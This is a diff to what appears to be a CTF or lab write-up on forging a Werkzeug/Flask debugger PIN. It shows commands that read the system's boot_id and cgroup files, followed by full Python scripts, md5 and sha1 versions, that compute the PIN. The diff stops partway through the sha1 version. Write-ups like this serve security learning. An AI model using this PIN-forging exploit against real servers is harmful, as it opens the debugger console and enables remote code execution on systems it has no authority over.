@@ -111,7 +111,7 @@ python -c 'print(0x0242ac110007)'
 >[!example]- Result
 >![[Pasted image 20250226172041.png]]
 
-- And get this value `/proc/sys/kernel/random/boot_id` in my case `e9630489-23dd-47bb-b05d-3250757832dc` and u have to append de value of `/proc/self/cgroup` (las slash)
+- And get this value `/proc/sys/kernel/random/boot_id` in my case `e9630489-23dd-47bb-b05d-3250757832dc` and u have to append de value of `/proc/self/cgroup` (last slash)
 ```bash
 cat /proc/sys/kernel/random/boot_id
 cat /proc/self/cgroup
@@ -120,7 +120,7 @@ cat /proc/self/cgroup
 >![[Pasted image 20250226172348.png]]
 >![[Pasted image 20250226175135.png]]
 
-- so the final code:
+- so the final code is this:
 ```python
 import hashlib
 from itertools import chain
@@ -133,10 +133,64 @@ probably_public_bits = [
 
 private_bits = [
 	'2485377892359',# str(uuid.getnode()),  /sys/class/net/ens33/address
-	'e9630489-23dd-47bb-b05d-3250757832dc'# get_machine_id(), /etc/machine-id
+	'e9630489-23dd-47bb-b05d-3250757832dcd746c2d220c5026b8883a99ea419aa1ebbf18f6394ace10a42985ca7f4eca816'# get_machine_id(), /etc/machine-id
 ]
 
 h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+	if not bit:
+		continue
+	if isinstance(bit, str):
+		bit = bit.encode('utf-8')
+	h.update(bit)
+h.update(b'cookiesalt')
+#h.update(b'shittysalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+	h.update(b'pinsalt')
+	num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+	for group_size in 5, 4, 3:
+		if len(num) % group_size == 0:
+			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+						  for x in range(0, len(num), group_size))
+			break
+	else:
+		rv = num
+
+print(rv)
+```
+>[!example]- Result
+>![[Pasted image 20250226182056.png]]
+
+- if we type de code doesnt works
+>[!example]- Result
+>![[Pasted image 20250226182130.png]]
+>![[Pasted image 20250226182248.png]]
+
+- This happend because de version of the application, we have to chain the encrypt mode to `sha1`, like this
+
+```python
+import hashlib
+from itertools import chain
+probably_public_bits = [
+	'root',# username
+	'flask.app',# modname
+	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+	'/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+	'2485377892359',# str(uuid.getnode()),  /sys/class/net/ens33/address
+	'e9630489-23dd-47bb-b05d-3250757832dcd746c2d220c5026b8883a99ea419aa1ebbf18f6394ace10a42985ca7f4eca816'# get_machine_id(), /etc/machine-id
+]
+
+h = hashlib.sha1()
 for bit in chain(probably_public_bits, private_bits):
 	if not bit:
 		continue
